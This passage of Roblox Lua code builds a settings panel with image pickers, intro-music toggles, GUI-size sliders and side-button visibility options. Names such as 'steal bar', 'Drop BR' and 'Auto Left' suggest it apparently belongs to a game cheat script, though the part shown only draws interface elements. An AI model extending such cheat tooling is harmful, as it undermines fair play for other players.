										instance3.TextColor3 = arg == 0 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(180, 180, 190)
									end
								end

								local instance4 = Instance.new("Frame", scrollingFrame2)
								instance4.LayoutOrder = 0
								instance4.Size = UDim2.fromOffset(52, 54)
								instance4.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
								instance4.BorderSizePixel = 0
								guiCorner(instance4, 8)
								tbl18[0] = guiStroke(
									instance4,
									stealBarBgIndex == 0 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 68),
									stealBarBgIndex == 0 and 1.8 or 1
								)
								instance3 = Instance.new("TextLabel", instance4)
								instance3.Size = UDim2.fromScale(1, 1)
								instance3.BackgroundTransparency = 1
								instance3.Text = "None"
								instance3.TextSize = 10
								instance3.Font = Enum.Font.GothamBold
								instance3.TextColor3 = stealBarBgIndex == 0 and Color3.fromRGB(255, 255, 255)
									or Color3.fromRGB(140, 140, 150)
								local textButton2 = Instance.new("TextButton", instance4)
								textButton2.Size = UDim2.fromScale(1, 1)
								textButton2.BackgroundTransparency = 1
								textButton2.Text = ""

								textButton2.MouseButton1Click:Connect(function()
									applyStealBarBgImage(0)
									fn45(0)
									saveConfig()
								end)

								for _, v86 in ipairs(ALLOWED_IMAGE_INDICES) do
									local frame3 = Instance.new("Frame", scrollingFrame2)
									frame3.LayoutOrder = v86
									frame3.Size = UDim2.fromOffset(72, 54)
									frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									frame3.BorderSizePixel = 0
									guiCorner(frame3, 8)
									tbl18[v86] = guiStroke(
										frame3,
										stealBarBgIndex == v86 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68),
										stealBarBgIndex == v86 and 1 or 1
									)
									local imageLabel = Instance.new("ImageLabel", frame3)
									imageLabel.Size = UDim2.fromScale(1, 1)
									imageLabel.BackgroundTransparency = 1
									imageLabel.ScaleType = Enum.ScaleType.Crop
									guiCorner(imageLabel, 8)
									setImage(imageLabel, BG_IMAGES[v86])
									local textLabel = Instance.new("TextLabel", frame3)
									textLabel.Size = UDim2.fromOffset(16, 14)
									textLabel.Position = UDim2.new(1, -18, 1, -16)
									textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									textLabel.BackgroundTransparency = 0.35
									textLabel.BorderSizePixel = 0
									textLabel.Text = tostring(v86)
									textLabel.TextSize = 8
									textLabel.Font = Enum.Font.GothamBold
									textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
									guiCorner(textLabel, 4)
									local textButton3 = Instance.new("TextButton", frame3)
									textButton3.Size = UDim2.fromScale(1, 1)
									textButton3.BackgroundTransparency = 1
									textButton3.Text = ""

									textButton3.MouseButton1Click:Connect(function()
										applyStealBarBgImage(v86)
										fn45(v86)
										saveConfig()
									end)
								end

								addSectLbl(settings, "SIDE BUTTON PICTURES", 0)
								local frame3 = Instance.new("Frame")
								frame3.Size = UDim2.new(1, 0, 0, 68)
								frame3.BackgroundTransparency = 1
								frame3.BorderSizePixel = 0
								frame3.LayoutOrder = 0
								frame3.Parent = settings
								local scrollingFrame3 = Instance.new("ScrollingFrame", frame3)
								scrollingFrame3.Size = UDim2.new(1, 0, 1, 0)
								scrollingFrame3.BackgroundTransparency = 1
								scrollingFrame3.BorderSizePixel = 0
								scrollingFrame3.ScrollBarThickness = 2
								scrollingFrame3.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 180)
								scrollingFrame3.ScrollBarImageTransparency = 0.6
								scrollingFrame3.CanvasSize = UDim2.new(0, 0, 1, 0)
								scrollingFrame3.AutomaticCanvasSize = Enum.AutomaticSize.X
								scrollingFrame3.ScrollingDirection = Enum.ScrollingDirection.X
								scrollingFrame3.ElasticBehavior = Enum.ElasticBehavior.Never
								scrollingFrame3.Active = true
								local uiListLayout3 = Instance.new("UIListLayout", scrollingFrame3)
								uiListLayout3.FillDirection = Enum.FillDirection.Horizontal
								uiListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
								uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout3.Padding = UDim.new(0, 6)
								local uiPadding3 = Instance.new("UIPadding", scrollingFrame3)
								uiPadding3.PaddingLeft = UDim.new(0, 4)
								uiPadding3.PaddingRight = UDim.new(0, 4)
								local tbl19 = {}
								local textLabel = nil

								local function fn46(arg)
									for k, v86 in pairs(tbl19) do
										v86.Color = k == arg and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68)
										v86.Thickness = k == arg and 1.8 or 1
									end

									if textLabel then
										textLabel.TextColor3 = arg == 0 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(180, 180, 190)
									end
								end

								local frame4 = Instance.new("Frame", scrollingFrame3)
								frame4.LayoutOrder = 0
								frame4.Size = UDim2.new(0, 52, 0, 54)
								frame4.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
								frame4.BorderSizePixel = 0
								guiCorner(frame4, 8)
								tbl19[0] = guiStroke(
									frame4,
									sideBtnBgIndex == 0 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 68),
									sideBtnBgIndex == 0 and 1.8 or 1
								)
								textLabel = Instance.new("TextLabel", frame4)
								textLabel.Size = UDim2.new(1, 0, 1, 0)
								textLabel.BackgroundTransparency = 1
								textLabel.Text = "None"
								textLabel.TextSize = 10
								textLabel.Font = Enum.Font.GothamBold
								textLabel.TextColor3 = sideBtnBgIndex == 0 and Color3.fromRGB(255, 255, 255)
									or Color3.fromRGB(140, 140, 140)
								local textButton3 = Instance.new("TextButton", frame4)
								textButton3.Size = UDim2.new(1, 0, 1, 0)
								textButton3.BackgroundTransparency = 1
								textButton3.Text = ""

								textButton3.MouseButton1Click:Connect(function()
									applySideButtonBgImage(0)
									fn46(0)
									saveConfig()
								end)

								for _, v86 in ipairs(ALLOWED_IMAGE_INDICES) do
									local frame5 = Instance.new("Frame", scrollingFrame3)
									frame5.LayoutOrder = v86
									frame5.Size = UDim2.new(0, 72, 0, 54)
									frame5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									frame5.BackgroundTransparency = 0
									frame5.BorderSizePixel = 0
									guiCorner(frame5, 8)
									tbl19[v86] = guiStroke(
										frame5,
										sideBtnBgIndex == v86 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(60, 60, 68),
										sideBtnBgIndex == v86 and 1 or 1
									)
									local imageLabel = Instance.new("ImageLabel", frame5)
									imageLabel.Size = UDim2.new(1, 0, 1, 0)
									imageLabel.BackgroundTransparency = 1
									imageLabel.ScaleType = Enum.ScaleType.Crop
									imageLabel.ImageTransparency = 0
									guiCorner(imageLabel, 8)
									setImage(imageLabel, BG_IMAGES[v86])
									local textLabel2 = Instance.new("TextLabel", frame5)
									textLabel2.Size = UDim2.new(0, 16, 0, 14)
									textLabel2.Position = UDim2.new(1, -18, 1, -16)
									textLabel2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
									textLabel2.BackgroundTransparency = 0.35
									textLabel2.BorderSizePixel = 0
									textLabel2.Text = tostring(v86)
									textLabel2.TextSize = 8
									textLabel2.Font = Enum.Font.GothamBold
									textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
									guiCorner(textLabel2, 4)
									local textButton4 = Instance.new("TextButton", frame5)
									textButton4.Size = UDim2.new(1, 0, 1, 0)
									textButton4.BackgroundTransparency = 1
									textButton4.Text = ""

									textButton4.MouseButton1Click:Connect(function()
										applySideButtonBgImage(v86)
										fn46(v86)

										if textLabel then
											textLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
										end

										saveConfig()
									end)
								end

								if sideBtnBgIndex == 0 and textLabel then
									textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
								end

								addSectLbl(settings, "GENERAL", 1)

								addToggleRow(settings, "Intro Screen", introEnabled, 1.5, nil, function(arg)
									introEnabled = arg

									if not arg then
										stopNineDuelsIntroMusic()
									end

									saveConfig()
									notify(
										"Intro Screen",
										arg and "enabled on next start" or "disabled on next start",
										"activated",
										2
									)
								end)

								local frame5 = Instance.new("Frame", settings)
								frame5.Name = "IntroMusicRow"
								frame5.Size = UDim2.new(1, 0, 0, 46)
								frame5.BackgroundColor3 = C.row
								frame5.BackgroundTransparency = 0.03
								frame5.BorderSizePixel = 0
								frame5.LayoutOrder = 2
								kuruCard(frame5)
								local instance5 = Instance.new("TextLabel", frame5)
								instance5.Size = UDim2.new(0, 105, 1, 0)
								instance5.Position = UDim2.fromOffset(12, 0)
								instance5.BackgroundTransparency = 1
								instance5.Text = "Intro Music"
								instance5.TextColor3 = C.text
								instance5.TextSize = 13
								instance5.Font = Enum.Font.GothamMedium
								instance5.TextXAlignment = Enum.TextXAlignment.Left
								local textButton4 = Instance.new("TextButton", frame5)
								textButton4.Size = UDim2.fromOffset(96, 27)
								textButton4.Position = UDim2.new(1, -150, 0.5, -13.5)
								textButton4.BackgroundColor3 = C.input
								textButton4.BorderSizePixel = 0
								textButton4.Text = introSongChoice
								textButton4.TextColor3 = C.text
								textButton4.TextSize = 10
								textButton4.Font = Enum.Font.GothamBold
								guiCorner(textButton4, 7)
								guiStroke(textButton4, C.divider, 1).Transparency = 0.45
								local frame6 = Instance.new("Frame", frame5)
								frame6.Size = UDim2.fromOffset(38, 20)
								frame6.Position = UDim2.new(1, -46, 0.5, -10)
								frame6.BackgroundColor3 = introSoundEnabled and C.blue or C.blueDim
								frame6.BorderSizePixel = 0
								guiCorner(frame6, 10)
								local frame7 = Instance.new("Frame", frame6)
								frame7.Size = UDim2.fromOffset(14, 14)
								frame7.Position = introSoundEnabled and UDim2.new(1, -17, 0.5, -7)
									or UDim2.fromOffset(3, 3)
								frame7.BackgroundColor3 = introSoundEnabled and C.bgDark or C.textDim
								frame7.BorderSizePixel = 0
								guiCorner(frame7, 7)
								local flag18 = introSoundEnabled

								local function fn47(arg)
									flag18 = arg
									tw(frame6, { BackgroundColor3 = arg and C.blue or C.blueDim })

									tw(frame7, {
										Position = arg and UDim2.new(1, -17, 0.5, -7) or UDim2.fromOffset(3, 3),
										BackgroundColor3 = arg and C.bgDark or C.textDim,
									})
								end

								local textButton5 = Instance.new("TextButton", frame5)
								textButton5.Size = UDim2.fromOffset(38, 20)
								textButton5.Position = frame6.Position
								textButton5.BackgroundTransparency = 1
								textButton5.Text = ""

								textButton5.MouseButton1Click:Connect(function()
									flag18 = not flag18
									introSoundEnabled = flag18
									fn47(flag18)

									if flag18 then
										playNineDuelsIntroMusic()
									else
										stopNineDuelsIntroMusic()
									end

									saveConfig()
								end)

								textButton4.MouseButton1Click:Connect(function()
									if introSongChoice == "Main" then
										introSongChoice = "Song 2"
									elseif introSongChoice == "Song 2" then
										introSongChoice = "Song 3"
									else
										introSongChoice = "Main"
									end

									textButton4.Text = introSongChoice

									if introSoundEnabled then
										playNineDuelsIntroMusic()
									end

									saveConfig()
									notify("Intro Music", introSongChoice .. " selected", "activated", 2)
								end)

								addToggleRow(
									settings,
									"Notifications",
									State.notificationsEnabled,
									2.8,
									nil,
									function(notificationsEnabled)
										State.notificationsEnabled = notificationsEnabled

										if not notificationsEnabled and NotifContainer2 then
											pcall(function()
												NotifContainer2:Destroy()
											end)

											NotifContainer2 = nil
											NotifLayout2 = nil
										end

										saveSettings()
									end
								)

								addToggleRow(
									settings,
									"Click Sounds",
									State.clickSoundsEnabled,
									2.9,
									nil,
									function(clickSoundsEnabled)
										State.clickSoundsEnabled = clickSoundsEnabled
										saveSettings()
									end
								)

								addSectLbl(settings, "GUI SCALE", 3)
								local frame8 = Instance.new("Frame", settings)
								frame8.Size = UDim2.new(1, 0, 0, 160)
								frame8.BackgroundColor3 = C.row
								frame8.BackgroundTransparency = 0.5
								frame8.BorderSizePixel = 0
								frame8.LayoutOrder = 4
								guiCorner(frame8, 10)
								guiStroke(frame8, C.divider, 1)
								local scale = uiScaleObj and uiScaleObj.Scale or 1
								local textLabel2 = Instance.new("TextLabel", frame8)
								textLabel2.Size = UDim2.new(0.55, 0, 0, 16)
								textLabel2.Position = UDim2.new(0, 12, 0, 8)
								textLabel2.BackgroundTransparency = 1
								textLabel2.Text = "GUI Size"
								textLabel2.TextColor3 = C.text
								textLabel2.TextSize = 11
								textLabel2.Font = Enum.Font.GothamBold
								textLabel2.TextXAlignment = Enum.TextXAlignment.Left
								local textLabel3 = Instance.new("TextLabel", frame8)
								textLabel3.Size = UDim2.new(0, 36, 0, 16)
								textLabel3.Position = UDim2.new(1, -46, 0, 8)
								textLabel3.BackgroundTransparency = 1
								textLabel3.Text = string.format("%.1fx", scale)
								textLabel3.TextColor3 = C.textDim
								textLabel3.TextSize = 10
								textLabel3.Font = Enum.Font.GothamBold
								textLabel3.TextXAlignment = Enum.TextXAlignment.Right
								local instance6 = Instance.new("Frame", frame8)
								instance6.Size = UDim2.new(1, -24, 0, 50)
								instance6.Position = UDim2.new(0, 12, 0, 30)
								instance6.BackgroundColor3 = Color3.fromRGB(50, 55, 65)
								instance6.BorderSizePixel = 0
								guiCorner(instance6, 3)
								local frame9 = Instance.new("Frame", instance6)
								frame9.Size = UDim2.new((scale - 0.5) / 1.5, 0, 1, 0)
								frame9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame9.BorderSizePixel = 0
								guiCorner(frame9, 3)
								local instance7 = Instance.new("Frame", instance6)
								instance7.Size = UDim2.fromOffset(14, 14)
								instance7.Position = UDim2.new((scale - 0.5) / 1.5, -7, 0.5, -7)
								instance7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance7.BorderSizePixel = 0
								guiCorner(instance7, 7)
								local textButton6 = Instance.new("TextButton", instance6)
								textButton6.Size = UDim2.new(1, 0, 0, 28)
								textButton6.Position = UDim2.new(0, 0, 0.5, -14)
								textButton6.BackgroundTransparency = 1
								textButton6.Text = ""
								textButton6.ZIndex = 5
								local flag19 = false
								local v86 = scale

								local function fn48(arg)
									local x = instance6.AbsoluteSize.X
									if x <= 0 then
										return
									end
									local n35 = math.clamp((arg.Position.X - instance6.AbsolutePosition.X) / x, 0, 1)
									local v87 = 10
									local n36 = math.floor((0.5 + n35 * 1.5) * 10 + 0.5) / v87
									frame9.Size = UDim2.new(n35, 0, 1, 0)
									instance7.Position = UDim2.new(n35, -7, 0.5, -7)
									textLabel3.Text = string.format("%.1fx", n36)
									v86 = n36
								end

								textButton6.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag19 = true
										fn48(input)
									end
								end)

								instance6.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag19 = true
										fn48(input)
									end
								end)

								UIS.InputChanged:Connect(function(input)
									local flag20 = flag19

									if flag19 then
										flag20 = input.UserInputType == Enum.UserInputType.MouseMovement
											or input.UserInputType == Enum.UserInputType.Touch
									end

									if flag20 then
										fn48(input)
									end
								end)

								UIS.InputEnded:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										if flag19 and uiScaleObj then
											uiScaleObj.Scale = v86
											_savedGuiScale = v86
											saveConfig()
										end

										flag19 = false
									end
								end)

								local frame10 = Instance.new("Frame", frame8)
								frame10.Size = UDim2.new(1, -24, 0, 1)
								frame10.Position = UDim2.new(0, 12, 0, 53)
								frame10.BackgroundColor3 = C.divider
								frame10.BackgroundTransparency = 0.4
								frame10.BorderSizePixel = 0
								local scale2 = stealBarScaleObj and stealBarScaleObj.Scale or 1
								local textLabel4 = Instance.new("TextLabel", frame8)
								textLabel4.Size = UDim2.new(0.55, 0, 0, 16)
								textLabel4.Position = UDim2.new(0, 12, 0, 60)
								textLabel4.BackgroundTransparency = 1
								textLabel4.Text = "Steal Bar Size"
								textLabel4.TextColor3 = C.text
								textLabel4.TextSize = 11
								textLabel4.Font = Enum.Font.GothamBold
								textLabel4.TextXAlignment = Enum.TextXAlignment.Left
								local textLabel5 = Instance.new("TextLabel", frame8)
								textLabel5.Size = UDim2.new(0, 40, 0, 16)
								textLabel5.Position = UDim2.new(1, -46, 0, 60)
								textLabel5.BackgroundTransparency = 1
								textLabel5.Text = string.format("%.1fx", scale2)
								textLabel5.TextColor3 = C.textDim
								textLabel5.TextSize = 10
								textLabel5.Font = Enum.Font.GothamBold
								textLabel5.TextXAlignment = Enum.TextXAlignment.Right
								local frame11 = Instance.new("Frame", frame8)
								frame11.Size = UDim2.new(1, -24, 0, 6)
								frame11.Position = UDim2.new(0, 12, 0, 86)
								frame11.BackgroundColor3 = Color3.fromRGB(50, 55, 65)
								frame11.BorderSizePixel = 0
								guiCorner(frame11, 3)
								local frame12 = Instance.new("Frame", frame11)
								frame12.Size = UDim2.new((scale2 - 0.5) / 1.5, 0, 1, 0)
								frame12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame12.BorderSizePixel = 0
								guiCorner(frame12, 3)
								local frame13 = Instance.new("Frame", frame11)
								frame13.Size = UDim2.fromOffset(14, 14)
								frame13.Position = UDim2.new((scale2 - 0.5) / 1.5, -7, 0.5, -7)
								frame13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame13.BorderSizePixel = 0
								guiCorner(frame13, 7)
								local textButton7 = Instance.new("TextButton", frame11)
								textButton7.Size = UDim2.new(1, 0, 0, 28)
								textButton7.Position = UDim2.new(0, 0, 0.5, -14)
								textButton7.BackgroundTransparency = 1
								textButton7.Text = ""
								textButton7.ZIndex = 5
								local flag20 = false

								local function fn49(arg)
									local x = frame11.AbsoluteSize.X
									if x <= 0 then
										return
									end
									local n35 = math.clamp((arg.Position.X - frame11.AbsolutePosition.X) / x, 0, 1)
									local n36 = math.floor((0.5 + n35 * 1.5) * 10 + 0.5) / 10
									frame12.Size = UDim2.new(n35, 0, 1, 0)
									frame13.Position = UDim2.new(n35, -7, 0.5, -7)
									textLabel5.Text = string.format("%.1fx", n36)
									scale2 = n36
								end

								textButton7.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag20 = true
										fn49(input)
									end
								end)

								frame11.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag20 = true
										fn49(input)
									end
								end)

								UIS.InputChanged:Connect(function(input)
									if
										flag20
										and (
											input.UserInputType == Enum.UserInputType.MouseMovement
											or input.UserInputType == Enum.UserInputType.Touch
										)
									then
										fn49(input)
									end
								end)

								UIS.InputEnded:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										if flag20 and stealBarScaleObj then
											stealBarScaleObj.Scale = scale2
										end

										flag20 = false
									end
								end)

								local instance8 = Instance.new("Frame", frame8)
								instance8.Size = UDim2.new(1, -18, 0, 1)
								instance8.Position = UDim2.new(0, 12, 0, 106)
								instance8.BackgroundColor3 = Color3.fromRGB(55, 60, 70)
								instance8.BorderSizePixel = 0
								local n35 = mobileButtonsSize or 45
								local textLabel6 = Instance.new("TextLabel", frame8)
								textLabel6.Size = UDim2.new(0.55, 0, 0, 16)
								textLabel6.Position = UDim2.new(0, 12, 0, 112)
								textLabel6.BackgroundTransparency = 1
								textLabel6.Text = "Side Button Size"
								textLabel6.TextColor3 = C.text
								textLabel6.TextSize = 11
								textLabel6.Font = Enum.Font.GothamBold
								textLabel6.TextXAlignment = Enum.TextXAlignment.Left
								local textLabel7 = Instance.new("TextLabel", frame8)
								textLabel7.Size = UDim2.new(0, 36, 0, 16)
								textLabel7.Position = UDim2.new(1, -46, 0, 112)
								textLabel7.BackgroundTransparency = 1
								textLabel7.Text = tostring(n35)
								textLabel7.TextColor3 = C.textDim
								textLabel7.TextSize = 10
								textLabel7.Font = Enum.Font.GothamBold
								textLabel7.TextXAlignment = Enum.TextXAlignment.Right
								local instance9 = Instance.new("Frame", frame8)
								instance9.Size = UDim2.new(1, -24, 0, 6)
								instance9.Position = UDim2.new(0, 12, 0, 138)
								instance9.BackgroundColor3 = Color3.fromRGB(50, 55, 65)
								instance9.BorderSizePixel = 0
								guiCorner(instance9, 3)
								local instance10 = Instance.new("Frame", instance9)
								instance10.Size = UDim2.new((n35 - 20) / 60, 0, 1, 0)
								instance10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance10.BorderSizePixel = 0
								guiCorner(instance10, 3)
								local frame14 = Instance.new("Frame", instance9)
								frame14.Size = UDim2.fromOffset(14, 14)
								frame14.Position = UDim2.new((n35 - 20) / 60, -7, 0.5, -7)
								frame14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								frame14.BorderSizePixel = 0
								guiCorner(frame14, 7)
								local textButton8 = Instance.new("TextButton", instance9)
								textButton8.Size = UDim2.new(1, 0, 0, 28)
								textButton8.Position = UDim2.new(0, 0, 0.5, -14)
								textButton8.BackgroundTransparency = 1
								textButton8.Text = ""
								textButton8.ZIndex = 5
								local flag21 = false
								local v87 = n35

								local function fn50(arg)
									local x = instance9.AbsoluteSize.X
									if x <= 0 then
										return
									end
									local n36 = math.clamp((arg.Position.X - instance9.AbsolutePosition.X) / x, 0, 1)
									local n37 = math.floor(20 + n36 * 60 + 0.5)
									instance10.Size = UDim2.new(n36, 0, 1, 0)
									frame14.Position = UDim2.new(n36, -7, 0.5, -7)
									textLabel7.Text = tostring(n37)
									v87 = n37
								end

								textButton8.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag21 = true
										fn50(input)
									end
								end)

								instance9.InputBegan:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										flag21 = true
										fn50(input)
									end
								end)

								UIS.InputChanged:Connect(function(input)
									local flag22 = flag21

									if flag21 then
										flag22 = input.UserInputType == Enum.UserInputType.MouseMovement
											or input.UserInputType == Enum.UserInputType.Touch
									end

									if flag22 then
										fn50(input)
									end
								end)

								UIS.InputEnded:Connect(function(input)
									if
										input.UserInputType == Enum.UserInputType.MouseButton1
										or input.UserInputType == Enum.UserInputType.Touch
									then
										if flag21 then
											mobileButtonsSize = v87

											if _phantomMobFrame then
												local n36 = v87 * 2 + 4
												local n37 = v87 * 5 + 16
												_phantomMobFrame.Size = UDim2.new(0, n36 + 12, 0, n37 + 12)
												_phantomMobFrame.Position =
													UDim2.new(1, -(n36 + 22), 0.5, -(n37 / 2 + 36))

												for _, v88 in pairs(_phantomBtnFrames) do
													v88.Size = UDim2.new(0, v87, 0, v87)
													local v89 = v88:FindFirstChildWhichIsA("TextLabel")

													if v89 then
														v89.TextSize = math.max(7, math.floor(v87 / 5))
													end
												end
											end

											saveConfig()
										end

										flag21 = false
									end
								end)

								addSectLbl(settings, "GUI", 11)
								local frame15 = Instance.new("Frame")
								frame15.Size = UDim2.new(1, 0, 0, 42)
								frame15.BackgroundColor3 = C.row
								frame15.BackgroundTransparency = 0.5
								frame15.BorderSizePixel = 0
								frame15.LayoutOrder = 12
								frame15.Parent = settings
								guiCorner(frame15, 10)
								guiStroke(frame15, C.divider, 1)
								local textLabel8 = Instance.new("TextLabel", frame15)
								textLabel8.Size = UDim2.new(0.6, 0, 0, 16)
								textLabel8.Position = UDim2.new(0, 12, 0, 8)
								textLabel8.BackgroundTransparency = 1
								textLabel8.Text = "Hide GUI Keybind"
								textLabel8.TextColor3 = C.text
								textLabel8.TextSize = 11
								textLabel8.Font = Enum.Font.GothamBold
								textLabel8.TextXAlignment = Enum.TextXAlignment.Left
								makeKeybindChip(frame15, "guiHide", 0, 90, 26, 9)
								addSectLbl(settings, "SIDE BUTTONS", 13)
								local frame16 = Instance.new("Frame", settings)
								frame16.Name = "HideSideButtonsRow"
								frame16.Size = UDim2.new(1, 0, 0, 46)
								frame16.BackgroundColor3 = C.row
								frame16.BackgroundTransparency = 0.03
								frame16.BorderSizePixel = 0
								frame16.LayoutOrder = 14
								kuruCard(frame16)
								local instance11 = Instance.new("TextLabel", frame16)
								instance11.Size = UDim2.new(1, -160, 1, 0)
								instance11.Position = UDim2.fromOffset(14, 0)
								instance11.BackgroundTransparency = 1
								instance11.Text = "Hide Mobile Buttons"
								instance11.TextColor3 = C.text
								instance11.TextSize = 14
								instance11.Font = Enum.Font.GothamMedium
								instance11.TextXAlignment = Enum.TextXAlignment.Left
								local frame17 = Instance.new("Frame", frame16)
								frame17.Size = UDim2.fromOffset(44, 22)
								frame17.Position = UDim2.new(1, -54, 0.5, -11)
								frame17.BackgroundColor3 = sideButtonsHidden and C.blue or C.blueDim
								frame17.BorderSizePixel = 0
								guiCorner(frame17, 11)
								local frame18 = Instance.new("Frame", frame17)
								frame18.Size = UDim2.fromOffset(16, 16)
								frame18.Position = sideButtonsHidden and UDim2.new(1, -19, 0.5, -8)
									or UDim2.fromOffset(3, 3)
								frame18.BackgroundColor3 = sideButtonsHidden and C.bgDark or C.textDim
								frame18.BorderSizePixel = 0
								guiCorner(frame18, 8)
								local flag22 = sideButtonsHidden

								local function fn51(arg)
									flag22 = arg
									tw(frame17, { BackgroundColor3 = arg and C.blue or C.blueDim })

									tw(frame18, {
										Position = arg and UDim2.new(1, -19, 0.5, -8) or UDim2.fromOffset(3, 3),
										BackgroundColor3 = arg and C.bgDark or C.textDim,
									})
								end

								local textButton9 = Instance.new("TextButton", frame16)
								textButton9.Size = UDim2.fromOffset(44, 22)
								textButton9.Position = frame17.Position
								textButton9.BackgroundTransparency = 1
								textButton9.Text = ""
								textButton9.ZIndex = 5

								textButton9.MouseButton1Click:Connect(function()
									flag22 = not flag22
									sideButtonsHidden = flag22
									fn51(flag22)

									if _phantomMobFrame then
										_phantomMobFrame.Visible = true

										for k, v88 in pairs(_phantomBtnFrames) do
											v88.Visible = not flag22 or sideButtonVisibility[k] ~= true
										end
									end

									saveConfig()
								end)

								local textButton10 = Instance.new("TextButton", frame16)
								textButton10.Size = UDim2.new(0, 36, 0, 30)
								textButton10.Position = UDim2.new(1, -96, 0.5, -15)
								textButton10.BackgroundColor3 = C.bgDark
								textButton10.BackgroundTransparency = 0.08
								textButton10.BorderSizePixel = 0
								textButton10.Text = "▼"
								textButton10.TextColor3 = C.textDim
								textButton10.TextSize = 12
								textButton10.Font = Enum.Font.GothamBold
								textButton10.AutoButtonColor = false
								textButton10.ZIndex = 5
								guiCorner(textButton10, 8)
								guiStroke(textButton10, C.divider, 1).Transparency = 0.65
								local frame19 = Instance.new("Frame", settings)
								frame19.Name = "SideButtonVisibilityOptions"
								frame19.Size = UDim2.new(1, -4, 0, 0)
								frame19.Position = UDim2.fromOffset(2, 0)
								frame19.BackgroundColor3 = C.input
								frame19.BackgroundTransparency = 0.22
								frame19.BorderSizePixel = 0
								frame19.LayoutOrder = 14.1
								frame19.Visible = false
								frame19.ClipsDescendants = true
								kuruCard(frame19)
								local uiListLayout4 = Instance.new("UIListLayout", frame19)
								uiListLayout4.Padding = UDim.new(0, 4)
								uiListLayout4.SortOrder = Enum.SortOrder.LayoutOrder
								local uiPadding4 = Instance.new("UIPadding", frame19)
								uiPadding4.PaddingTop = UDim.new(0, 6)
								uiPadding4.PaddingBottom = UDim.new(0, 6)
								uiPadding4.PaddingLeft = UDim.new(0, 50)
								uiPadding4.PaddingRight = UDim.new(0, 6)

								local function fn52(text, arg, layoutOrder)
									local frame20 = Instance.new("Frame", frame19)
									frame20.Size = UDim2.new(1, 0, 0, 40)
									frame20.LayoutOrder = layoutOrder
									frame20.BackgroundColor3 = C.row
									frame20.BackgroundTransparency = 0.03
									frame20.BorderSizePixel = 0
									kuruCard(frame20)
									local instance12 = Instance.new("TextLabel", frame20)
									instance12.Size = UDim2.new(1, -74, 1, 0)
									instance12.Position = UDim2.fromOffset(12, 0)
									instance12.BackgroundTransparency = 1
									instance12.Text = text
									instance12.TextColor3 = C.text
									instance12.TextSize = 13
									instance12.Font = Enum.Font.GothamMedium
									instance12.TextXAlignment = Enum.TextXAlignment.Left
									local instance13 = Instance.new("Frame", frame20)
									instance13.Size = UDim2.fromOffset(44, 22)
									instance13.Position = UDim2.new(1, -54, 0.5, -11)
									instance13.BackgroundColor3 = sideButtonVisibility[arg] ~= false and C.blue
										or C.blueDim
									instance13.BorderSizePixel = 0
									guiCorner(instance13, 11)
									local instance14 = Instance.new("Frame", instance13)
									instance14.Size = UDim2.fromOffset(16, 16)
									instance14.Position = sideButtonVisibility[arg] ~= false
											and UDim2.new(1, -19, 0.5, -8)
										or UDim2.fromOffset(3, 3)
									instance14.BackgroundColor3 = sideButtonVisibility[arg] ~= false and C.bgDark
										or C.textDim
									instance14.BorderSizePixel = 0
									guiCorner(instance14, 8)
									local flag23 = sideButtonVisibility[arg] ~= false

									local function fn53(arg2)
										flag23 = arg2
										tw(instance13, { BackgroundColor3 = arg2 and C.blue or C.blueDim })

										tw(instance14, {
											Position = arg2 and UDim2.new(1, -19, 0.5, -8) or UDim2.fromOffset(3, 3),
											BackgroundColor3 = arg2 and C.bgDark or C.textDim,
										})
									end

									local textButton11 = Instance.new("TextButton", frame20)
									textButton11.Size = UDim2.fromScale(1, 1)
									textButton11.BackgroundTransparency = 1
									textButton11.Text = ""
									textButton11.ZIndex = 5

									textButton11.MouseButton1Click:Connect(function()
										flag23 = not flag23
										sideButtonVisibility[arg] = flag23
										fn53(flag23)
										local v88 = _phantomBtnFrames[arg]

										if v88 and sideButtonsHidden then
											v88.Visible = not flag23
										end

										saveConfig()
									end)
								end

								for i, v88 in ipairs({
									{ "Drop BR", "DROP_BR" },
									{ "Auto Left", "AUTO_LEFT" },
